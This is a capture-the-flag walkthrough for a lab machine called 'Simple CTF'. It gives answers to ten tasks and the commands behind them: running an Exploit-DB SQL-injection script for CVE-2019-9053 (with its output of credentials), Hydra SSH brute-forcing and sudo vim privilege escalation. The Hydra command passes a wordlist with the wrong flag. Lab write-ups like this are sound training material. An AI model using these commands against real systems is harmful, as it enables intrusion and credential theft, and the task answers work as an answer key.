# Machine NAME : Simple CTF
# Machine IP   : 10.10.126.194

***TASK 1 : How many services are running under port 1000?***<br>
```
: 2 <br>
: Reference file :  Gathering/SimpleCTF_Scanning.txt
```

***TASK 2 : What is running on the higher port?***<br>
```
: ssh
```
***TASK 3 : What's the CVE you're using against the application?***<br>
```
: CVE-2019-9053 <br>

&nbsp; SITE MAP SCANING : gobuster (Reference file : Gathering/SimpleCTF_gobuster.txt)<br>
&nbsp; 1.EXPLOIT-DB LINK : https://www.exploit-db.com/exploits/46635 <br>
&nbsp; 2.convert python2 to python3 command : 2to3 -w {file_name} <br>
&nbsp; 3.command :./46635.py -u http://{ip}/{dir}/ <br>
&nbsp;&nbsp;[+] Salt for password found: 1dac0d92e9fa6bb2 <br>
&nbsp;&nbsp;[+] Username found: mitch <br>
&nbsp;&nbsp;[+] Email found: admin3@ <br>
&nbsp;&nbsp;[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96 <br>
```

***TASK 4: To what kind of vulnerability is the application vulnerable?***<br>
```
: sqli <br>
```

***TASK 5: What's the password?*** <br>
```
: password is secret <br>
&nbsp; : PASSWORD BRUTE FORCING (Hydra) <br>
&nbsp; : hydra -l mitch -p rockyou.txt ssh://{ip}/
```

***TASK6 : Where can you login with the details obtained?***<br>
```
: ssh
```

***TASK 7 : What's the user flag?*** <br>
```
Do it 
```

***TASK 8: Is there any other user in the home directory? What's its name?***<br>
```
:sunbath
```

***TASK 9 :	What can you leverage to spawn a privileged shell?*** <br>
```
:vim
```

***TASK 10 : What's the root flag?***<br>
```
&nbsp; command : sudo -l <br>
&nbsp; command : vim privilge escalate!<br>
```